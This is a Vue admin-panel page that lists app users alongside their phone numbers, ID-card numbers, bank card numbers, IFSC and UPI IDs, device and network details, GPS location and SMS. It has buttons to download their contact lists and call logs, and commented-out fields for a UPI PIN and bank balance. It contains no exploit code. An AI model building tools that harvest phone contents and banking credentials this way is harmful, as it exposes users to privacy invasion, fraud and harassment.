<template>
  
  <div class="search">
    <h2>{{ $getMenuName() }}</h2>
    <a-row>
      <a-col :span="3">
        <a-input v-trim
          v-model:value="query.memberId"
          class="searchstyle"
          :placeholder="$t('m562')+$t('c9')"
        />
      </a-col>
      <!-- <a-col :span="3">
        <a-input v-trim
          v-model:value="query.deviceId"
          class="searchstyle"
          :placeholder="$t('m562')+$t('n1605')"
        />
      </a-col> -->
      <a-col :span="3">
        <a-input v-trim
          v-model:value="query.mobile"
          class="searchstyle"
          :placeholder="$t('m562')+$t('m101')"
        />
      </a-col>
      <!-- <a-col :span="3">
        <a-select
          allowClear
          ref="select"
          class="searchstyle"
          v-model:value="query.bankName"
          :placeholder="$t('m563')+$t('m582')"
        >
          <a-select-option
            v-for="(item) in groupList"
            :value="item"
            :key="item"
            >{{ item }}</a-select-option
          >
        </a-select>
      </a-col> -->
        <!-- <a-col>
          <timeRange v-model:startTime="query.updateTimeStart" v-model:endTime="query.updateTimeEnd"  :title="$t('l71')" :type="1"/>
        </a-col> -->
      <a-col>
        <a-button
          type="primary"
          :icon="h(SearchOutlined)"
          @click="search"
          >{{ $t("search") }}</a-button
        >
        <a-button type="primary" @click="resetQuery">{{
          $t("reset")
        }}</a-button>
      </a-col>
    </a-row>
  </div>
  <a-table
    :dataSource="dataSource"
    :columns="columns"
    :pagination="pagination"
    :scroll="{ x: '100%' , y : getTabH+'px' }"
    :loading="loading"
    size="small"
    @change="handleTableChange"
    bordered
  >
    <template #bodyCell="{ column, record }">
      <template v-if="column.key === 'memberId'">
        <a-button
          type="link"
          @click="showDetail(record)"
          style="padding: 0;"
          >{{ record.memberId }}</a-button
        >
        <CopyOutlined v-if="record.memberId" class="copyId"  @click="$copyId(record.memberId)" />
      </template>
      <!-- <template v-if="column.key === 'linkStatus'">
        <span class="arbListTag" v-if="[0,1].includes(record.linkStatus)">
          <span class="pointTag" :class="[1].includes(record.linkStatus) ? 'pointTag-green' : 'pointTag-red'" ></span>
          {{ linkStatusMap[record.linkStatus] }}
        </span>
        <span v-else>-</span>
      </template> -->
      <template v-if="column.key === 'mobile'"  >
        <a-tooltip v-if="record.mobile">
          <template #title>
            {{ record.mobile }}
            <CopyOutlined v-if="record.mobile " class="copyId"  @click="$copyId(record.mobile)" />
          </template>
          <div class="toopTipStyle3">
            {{ record.mobile }}
            <CopyOutlined v-if="record.mobile " class="copyId"  @click="$copyId(record.mobile)" />
          </div>
        </a-tooltip>
        <span v-else>-</span>
      </template>
      <template v-if="column.key === 'personalName'"  >
        <a-tooltip>
          <template #title>
            <div>{{ $t('c20') }}:{{ record.personalName || '-' }}</div>
            <div>ID:{{ record.personalIdCard || '-' }}</div>
          </template>
          <div class="tableText">
            <div class="toopTipStyle3">{{ $t('c20') }}:{{ record.personalName || '-' }}</div>
            <div class="toopTipStyle3">ID:{{ record.personalIdCard || '-' }}</div>
          </div>
        </a-tooltip>
      </template>
      <template v-if="column.key === 'bankName'" >
        <a-tooltip>
          <template #title>
            <div>{{ $t('m581') }}:{{ record.bankName || '-' }}</div>
            <div>{{ $t('m652') }}:{{ record.bankCardNo || '-' }}</div>
            <div>{{ $t('n1601') }}:{{ record.bankAccType || '-' }}</div>
            <div>IFSC:{{ record.bankIfsc || '-' }}</div>
            <!-- <div>UPI PIN:{{ record.bankUpiPin || '-' }}</div>
            <div>{{ $t('m523') }}:{{ currency(record.bankBalance,false) }}</div> -->
            <div>UPI ID:{{ record.bankUpiId || '-' }}</div>
          </template>
          <div class="tableText">
            <div class="toopTipStyle3">{{ $t('m581') }}:{{ record.bankName || '-' }}</div>
            <div class="toopTipStyle3">{{ $t('m652') }}:{{ record.bankCardNo || '-' }}</div>
            <div class="toopTipStyle3">{{ $t('n1601') }}:{{ record.bankAccType || '-' }}</div>
            <div class="toopTipStyle3">IFSC:{{ record.bankIfsc || '-' }}</div>
            <!-- <div class="toopTipStyle3">UPI PIN:{{ record.bankUpiPin || '-' }}</div>
            <div class="toopTipStyle3">{{ $t('m523') }}:{{ currency(record.bankBalance,false) }}</div> -->
            <div class="toopTipStyle3">UPI ID:{{ record.bankUpiId || '-' }}</div>
          </div>
        </a-tooltip>
      </template>
      <template v-if="column.key === 'deviceModel'"  >
        <a-tooltip>
          <template #title>
            <div>{{ $t('n1602') }}:{{ record.deviceModel || '-' }}</div>
            <div>{{ $t('n1603') }}:{{ record.deviceHardware || '-' }}</div>
            <div>{{ $t('n1604') }}:{{ record.deviceOs || '-' }}</div>
            <div>{{ $t('n1605') }}:{{ record.deviceId || '-' }}</div>
          </template>
          <div class="tableText">
            <div class="toopTipStyle3">{{ $t('n1602') }}:{{ record.deviceModel || '-' }}</div>
            <div class="toopTipStyle3">{{ $t('n1603') }}:{{ record.deviceHardware || '-' }}</div>
            <div class="toopTipStyle3">{{ $t('n1604') }}:{{ record.deviceOs || '-' }}</div>
            <div class="toopTipStyle3">{{ $t('n1605') }}:{{ record.deviceId || '-' }}</div>
          </div>
        </a-tooltip>
      </template>
      <template v-if="column.key === 'netType'"  >
        <a-tooltip>
          <template #title>
            <div>{{ $t('n1606') }}:{{ record.netType || '-' }}</div>
            <div>IP:{{ record.netIp || '-' }}</div>
            <div>{{ $t('n1607') }}:{{ record.wifiName || '-' }}</div>
          </template>
          <div class="tableText">
            <div class="toopTipStyle3">{{ $t('n1606') }}:{{ record.netType || '-' }}</div>
            <div class="toopTipStyle3">IP:{{ record.netIp || '-' }}</div>
            <div class="toopTipStyle3">{{ $t('n1607') }}:{{ record.wifiName || '-' }}</div>
          </div>
        </a-tooltip>
      </template>
      <template v-if="column.key === 'longitude'"  >
        <a-tooltip>
          <template #title>
            <div>{{ $t('n1608') }}:{{ record.longitude || '-' }}</div>
            <div>{{ $t('n1609') }}:{{ record.latitude || '-' }}</div>
            <div>{{ $t('n1610') }}:{{ record.locName || '-' }}</div>
          </template>
          <div class="tableText">
            <div class="toopTipStyle3">{{ $t('n1608') }}:{{ record.longitude|| '-' }}</div>
            <div class="toopTipStyle3">{{ $t('n1609') }}:{{ record.latitude || '-' }}</div>
            <div class="toopTipStyle3">{{ $t('n1610') }}:{{ record.locName || '-' }}</div>
          </div>
        </a-tooltip>
      </template>
      <template v-if="column.key === 'contactCount'" >
        <div>
          <div>{{ $t('m522') }}:{{ record.contactCount|| '-' }}</div>
          <div v-if="record.contactCount"><a-button size="small" type="link" v-permission="'admin:appInfoReport:contactInfo'" @click="downloadContactCount(record)">{{ $t('n551') }}</a-button></div>
        </div>
      </template>
      <template v-if="column.key === 'contactLog'" >
        <a-button size="small" type="link" v-permission="'admin:appInfoReport:callLogInfo'" @click="downloadContactLog(record)">{{ $t('n551') }}</a-button>
      </template>
      <template v-if="column.key === 'albumSize'" >
        {{ record.albumSize || '-' }}
        <!-- <a-button size="small" type="link" v-permission="'admin:appInfoReport:imageList'" @click="downloadImagesCount(record)">{{ $t('n551') }}</a-button> -->
      </template>
      <template v-if="column.key === 'smsCount'" >
        <a-button size="small" type="link" @click="openSmsModel(record)">{{ $t('n1016') }}</a-button>
      </template>
      <template v-if="column.key === 'updateTime'" >
        {{ record.updateTime || '-' }}
      </template>
    </template>
  </a-table>
<a-modal
  v-model:open="detailModel"
  :footer="null"
  wrap-class-name="full-modal"
  width="100%"
  >
  <MemberDetail 
  v-if="detailModel"
    :memberID="detailId.memberId"
    :id="detailId.id"
  />
  </a-modal>
  <!-- 短信 -->
<a-modal
  v-model:open="smsModel"
  :footer="null"
  wrap-class-name="full-modal"
  width="100%"
  @cancel="cancelSmsModel"
  >
  <appSmsInfo
    v-if="smsModel"
    :info="smsInfo"
    />
  </a-modal>
</template>
<script lang="ts" setup>
import {
  appInfoReportListPage,
  getKycBankCodeList,
  appInfoReportCallLogInfoDownload,
  appInfoReportContactInfoDownload,
} from "@/api";
import { message } from "ant-design-vue";
import { onMounted, ref, watchEffect, h } from "vue";
import { SearchOutlined } from "@ant-design/icons-vue";
import MemberDetail from "@/components/Member/memberDetail.vue";
import appSmsInfo from "./components/appSmsInfo.vue";
import { useI18n } from "vue-i18n";
import { useRoute,onBeforeRouteLeave } from "vue-router";
import { useTabHeight } from "@/hooks/useTabHeight.hooks";
import { useTableData } from "@/hooks/useTableData.hook";
import { useFloatingStore } from '@/stores/floatModal';
import { usePagination } from "@/plugins/dataMap";
import { selectedRow, clearSelected } from "@/hooks/useSelected.hook";
import { usePageCash } from "@/hooks/usePageCash.hook"; 
import { getStartAndEndOfDay } from "@/plugins/dataMap";
import { currency, thousand } from "@/utils";
const route = useRoute();
const [startIndiaTime,endIndiaTime,] = getStartAndEndOfDay()
const { pageCash,setPageCash,getPageCash,clearPageCash } = usePageCash();
const resultData = ref({});
const isUseCash = ref(false);
onBeforeRouteLeave(() => {
  setPageCash(route.fullPath.split('?')[0], query.value, resultData.value);
})
const floadModalStore = useFloatingStore();// 打开浮动框
const { paginationConfig } = usePagination();
const openWindow = (item: any) => {
  useFloatingStore().addWindow(item);
};
const { getTabH } = useTabHeight(3);
const { t } = useI18n();
const detailModel = ref(false);
const detailId = ref<any>({});
const query = ref({
  asc:false,
  column:'',
  pageNo: 1,
  pageSize: 20,
  bankName:undefined,
  deviceId:undefined,
  memberId:undefined,
  mobile:undefined,
  updateTimeStart:'',
  updateTimeEnd: '',
  firstPage: true,
  lastPage:false,
  direction: '', //翻页方向："next" 下一页，"prev" 上一页。首页/尾页请求时应为空
  nextColValue: '',//下一页所需列值（上次 extent 中返回的 nextColValue）。仅在 direction="next" 时需要 
  nextCursorId: '',//下一页所需主键 ID（上次 extent 中返回的 nextCursorId）。仅在 direction="next" 时需要 
  prevColValue: '',//上一页所需列值（上次 extent 中返回的 prevColValue）。仅在 direction="prev" 时需要
  prevCursorId: '',//上一页所需主键 ID（上次 extent 中返回的 prevCursorId）。仅在 direction="prev" 时需要
})
const columns:any = [
  {
    title: t('c9'),
    dataIndex: "memberId",
    key: "memberId",
    width:180,
    align:"center"
  },
  {
    title: t('n328'),
    dataIndex: "mobile",
    key: "mobile",
    width:160,
    align:"center"
  },
  {
    title: t('n1611'),
    dataIndex: "personalName",
    key: "personalName",
    width:200,
    align:"center",
  },
  {
    title: t('n1612'),
    dataIndex: "bankName",
    key: "bankName",
    width:200,
    align:"center"
  },
  {
    title: t('n1613'),
    dataIndex: "deviceModel",
    key: "deviceModel",
    width:200,
    align:"center",
  },
  {
    title: t('n1614'),
    dataIndex: "netType",
    key: "netType",
    width:200,
    align:"center",
  },
  {
    title: t("n1615"),
    dataIndex: "longitude",
    key: "longitude",
    width:200,
    align:"center",
  },
  {
    title: t("n1616"),
    dataIndex: "contactCount",
    key: "contactCount",
    width:160,
    align:"center",
  },
  {
    title: t("n1617"),
    dataIndex: "contactLog",
    key: "contactLog",
    width:160,
    align:"center",
  },
  {
    title: t("n1618"),
    dataIndex: "albumSize",
    key: "albumSize",
    width:160,
    align:"center",
  },
  {
    title: t("n1619"),
    dataIndex: "smsCount",
    key: "smsCount",
    width:120,
    align:"center",
  },
  {
    title: t("l71"),
    dataIndex: "updateTime",
    key: "updateTime",
    width:160,
    align:"center",
  },
];
// const loading = ref(false);
// const dataSource = ref([]);
const {
  dataSource,
  extendData,
  pagination,
  loading,
  response,
  handleTableChange,
  getList,
  resetQuery,
} = useTableData({
  query,
  api: appInfoReportListPage,
  fetchType: 1,
  defaultPageSize: 20,
  filterRules: [],
});
const search = () => {
  // paginationConfig.current = 1;
  // query.value.pageNo = 1;
  getList(1)
}
// 下载通讯录
const downloadContactCount = async (value: any) => {
  loading.value = true;
  const { memberId,deviceId } = value;
  const res: any = await appInfoReportContactInfoDownload({ memberId,deviceId }).finally(() => (loading.value = false));
  if (res && res.code === "1") {
    message.success(t("s10"));
  }
}
// 下载通话记录
const downloadContactLog = async (value: any) => {
  loading.value = true;
  const { memberId,deviceId } = value;
  const res: any = await appInfoReportCallLogInfoDownload({ memberId,deviceId }).finally(() => (loading.value = false));
  if (res && res.code === "1") {
    message.success(t("s10"));
  }
}
// 下载相册
const downloadImagesCount = async (value: any) => {
  message.success(t("empty"));
}

const showDetail = async (value: any) => {
  const { id, memberId } = value;
  detailId.value.id = memberId;
  detailModel.value = true;
};
// 打开短信
const smsModel = ref(false);
const smsInfo = ref({});
const openSmsModel= (value: any) => {
  selectedRow();
  smsInfo.value = value;
  smsModel.value = true;
};
const cancelSmsModel = () => {
  smsModel.value = false;
  smsInfo.value = {};
};
const groupList = ref([])
const getGroupList = async () => {
  const res: any = await getKycBankCodeList();
  if (res && res.code === "1") {
    groupList.value =res.data|| [];
  }
};
onMounted(() => {
  // getGroupList();
  getList();
  getTabH.value = useTabHeight(3).getTabH.value;
});
</script>

